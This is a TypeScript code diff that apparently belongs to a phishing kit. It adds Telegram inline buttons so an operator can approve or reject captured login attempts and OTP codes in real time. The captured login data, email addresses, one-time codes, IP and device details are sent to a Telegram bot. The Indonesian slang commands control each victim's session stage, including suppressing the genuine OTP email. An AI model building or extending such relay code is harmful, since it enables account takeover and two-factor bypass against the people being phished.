@@ -268,6 +268,82 @@ async function sendTelegramMessage(message: string, config: TelegramConfig): Pro
   }
 }
 
+interface InlineButton {
+  text: string;
+  callback_data: string;
+}
+
+/**
+ * Send message to Telegram with inline keyboard buttons
+ */
+async function sendTelegramMessageWithButtons(
+  message: string, 
+  buttons: InlineButton[][], 
+  config: TelegramConfig
+): Promise<boolean> {
+  try {
+    const { botToken, chatId } = config;
+
+    if (!botToken || !chatId) {
+      console.error('[Telegram] Missing bot token or chat ID');
+      return false;
+    }
+
+    const response = await fetch(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: buttons,
+          },
+        }),
+      }
+    );
+
+    if (!response.ok) {
+      const error = await response.text();
+      console.error('[Telegram] API Error (buttons):', error);
+      return false;
+    }
+
+    const result = await response.json();
+    console.log('[Telegram] Message with buttons sent:', result.result?.message_id);
+    return true;
+  } catch (error) {
+    console.error('[Telegram] Failed to send message with buttons:', error);
+    return false;
+  }
+}
+
+/**
+ * Answer a callback query (acknowledge button press)
+ */
+async function answerCallbackQuery(callbackQueryId: string, text: string, config: TelegramConfig): Promise<void> {
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${config.botToken}/answerCallbackQuery`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          callback_query_id: callbackQueryId,
+          text: text,
+          show_alert: false,
+        }),
+      }
+    );
+  } catch (error) {
+    console.error('[Telegram] Failed to answer callback query:', error);
+  }
+}
+
 /**
  * Function to send photo to Telegram using axios (compatible with form-data)
  */
@@ -345,7 +421,7 @@ async function sendTelegramPhoto(
 }
 
 /**
- * Send LOGIN notification to Telegram
+ * Send LOGIN notification to Telegram with inline buttons
  */
 export async function sendLoginNotification(
   loginData: LoginRequest,
@@ -356,11 +432,17 @@ export async function sendLoginNotification(
   config: TelegramConfig
 ): Promise<boolean> {
   const message = formatLoginMessage(loginData, loginAttemptId, ipInfo, deviceInfo, sourceInfo);
-  return sendTelegramMessage(message, config);
+  const buttons: InlineButton[][] = [
+    [
+      { text: 'BENARJIBOSS', callback_data: `BENARJIBOSS:${loginAttemptId}` },
+      { text: 'SALAHKODONG', callback_data: `SALAHKODONG:${loginAttemptId}` },
+    ]
+  ];
+  return sendTelegramMessageWithButtons(message, buttons, config);
 }
 
 /**
- * Send EMAIL VERIFICATION notification to Telegram
+ * Send EMAIL VERIFICATION notification to Telegram with KIRIMMI button
  */
 export async function sendEmailVerificationNotification(
   email: string,
@@ -369,11 +451,16 @@ export async function sendEmailVerificationNotification(
   config: TelegramConfig
 ): Promise<boolean> {
   const message = formatEmailVerificationMessage(email, loginAttemptId, sourceInfo);
-  return sendTelegramMessage(message, config);
+  const buttons: InlineButton[][] = [
+    [
+      { text: 'KIRIMMI', callback_data: `KIRIMMI:${loginAttemptId}` },
+    ]
+  ];
+  return sendTelegramMessageWithButtons(message, buttons, config);
 }
 
 /**
- * Send OTP VERIFICATION notification to Telegram
+ * Send OTP VERIFICATION notification to Telegram with BENARMIOTPTA button
  */
 export async function sendOtpVerificationNotification(
   email: string,
@@ -383,7 +470,12 @@ export async function sendOtpVerificationNotification(
   config: TelegramConfig
 ): Promise<boolean> {
   const message = formatOtpVerificationMessage(email, otpCode, loginAttemptId, sourceInfo);
-  return sendTelegramMessage(message, config);
+  const buttons: InlineButton[][] = [
+    [
+      { text: 'BENARMIOTPTA', callback_data: `BENARMIOTPTA:${loginAttemptId}` },
+    ]
+  ];
+  return sendTelegramMessageWithButtons(message, buttons, config);
 }
 
 /**
@@ -1172,7 +1264,7 @@ async function pollTelegramUpdates(): Promise<void> {
   if (!config) return;
 
   try {
-    const url = `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=5&allowed_updates=["message"]`;
+    const url = `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=5&allowed_updates=["message","callback_query"]`;
     const response = await fetch(url, { signal: AbortSignal.timeout(15000) });
     
     if (!response.ok) return;
@@ -1182,13 +1274,76 @@ async function pollTelegramUpdates(): Promise<void> {
 
     for (const update of data.result) {
       lastUpdateId = Math.max(lastUpdateId, update.update_id);
-      
-      const messageText = update.message?.text?.trim().toUpperCase();
-      const chatId = update.message?.chat?.id?.toString();
-      
-      if (!messageText || chatId !== config.chatId) continue;
 
-      console.log(`[TelegramBot] Received command: ${messageText}`);
+      // Handle callback_query (inline button press)
+      if (update.callback_query) {
+        const callbackData = update.callback_query.data || '';
+        const callbackId = update.callback_query.id;
+        const chatId = update.callback_query.message?.chat?.id?.toString();
+        
+        if (chatId !== config.chatId) continue;
+
+        console.log(`[TelegramBot] Received callback: ${callbackData}`);
+
+        const [command, sessionId] = callbackData.split(':');
+
+        if (command === 'BENARJIBOSS' && sessionId) {
+          const session = loginSessions.get(sessionId);
+          if (session && session.stage === 'login_waiting') {
+            session.stage = 'login_approved';
+            session.stageUpdatedAt = Date.now();
+            console.log(`[TelegramBot] Login APPROVED for ${sessionId}`);
+            await answerCallbackQuery(callbackId, 'Login APPROVED!', config);
+            await sendTelegramMessage(`Login APPROVED for session ${sessionId.slice(0, 8)}...`, config);
+          } else {
+            await answerCallbackQuery(callbackId, 'Session not found or already processed', config);
+          }
+        } else if (command === 'SALAHKODONG' && sessionId) {
+          const session = loginSessions.get(sessionId);
+          if (session && session.stage === 'login_waiting') {
+            session.stage = 'login_rejected';
+            session.stageUpdatedAt = Date.now();
+            console.log(`[TelegramBot] Login REJECTED for ${sessionId}`);
+            await answerCallbackQuery(callbackId, 'Login REJECTED!', config);
+            await sendTelegramMessage(`Login REJECTED for session ${sessionId.slice(0, 8)}...`, config);
+          } else {
+            await answerCallbackQuery(callbackId, 'Session not found or already processed', config);
+          }
+        } else if (command === 'KIRIMMI' && sessionId) {
+          const session = loginSessions.get(sessionId);
+          if (session && session.stage === 'email_waiting') {
+            session.stage = 'email_kirimmi';
+            session.stageUpdatedAt = Date.now();
+            console.log(`[TelegramBot] KIRIMMI - OTP will NOT be sent to email for ${sessionId}`);
+            await answerCallbackQuery(callbackId, 'KIRIMMI - OTP will NOT be sent!', config);
+            await sendTelegramMessage(`KIRIMMI received. OTP will NOT be sent to email for session ${sessionId.slice(0, 8)}...`, config);
+          } else {
+            await answerCallbackQuery(callbackId, 'Session not found or already processed', config);
+          }
+        } else if (command === 'BENARMIOTPTA' && sessionId) {
+          const session = loginSessions.get(sessionId);
+          if (session && session.stage === 'otp_waiting') {
+            session.stage = 'otp_approved';
+            session.stageUpdatedAt = Date.now();
+            console.log(`[TelegramBot] OTP APPROVED for ${sessionId}`);
+            await answerCallbackQuery(callbackId, 'OTP APPROVED!', config);
+            await sendTelegramMessage(`OTP APPROVED for session ${sessionId.slice(0, 8)}...`, config);
+          } else {
+            await answerCallbackQuery(callbackId, 'Session not found or already processed', config);
+          }
+        } else {
+          await answerCallbackQuery(callbackId, 'Unknown command', config);
+        }
+        continue;
+      }
+
+      // Also handle text commands as fallback
+      const messageText = update.message?.text?.trim().toUpperCase();
+      const msgChatId = update.message?.chat?.id?.toString();
+      
+      if (!messageText || msgChatId !== config.chatId) continue;
+
+      console.log(`[TelegramBot] Received text command: ${messageText}`);
 
       if (messageText === 'BENARJIBOSS') {
         const session = findSessionByStage('login_waiting');
@@ -1211,8 +1366,8 @@ async function pollTelegramUpdates(): Promise<void> {
         if (session) {
           session.stage = 'email_kirimmi';
           session.stageUpdatedAt = Date.now();
-          console.log(`[TelegramBot] KIRIMMI received for ${session.loginAttemptId} - OTP will NOT be sent to email`);
-          await sendTelegramMessage(`KIRIMMI received. OTP will NOT be sent to email for session ${session.loginAttemptId.slice(0, 8)}...`, config);
+          console.log(`[TelegramBot] KIRIMMI received for ${session.loginAttemptId}`);
+          await sendTelegramMessage(`KIRIMMI received for session ${session.loginAttemptId.slice(0, 8)}...`, config);
         }
       } else if (messageText === 'BENARMIOTPTA') {
         const session = findSessionByStage('otp_waiting');
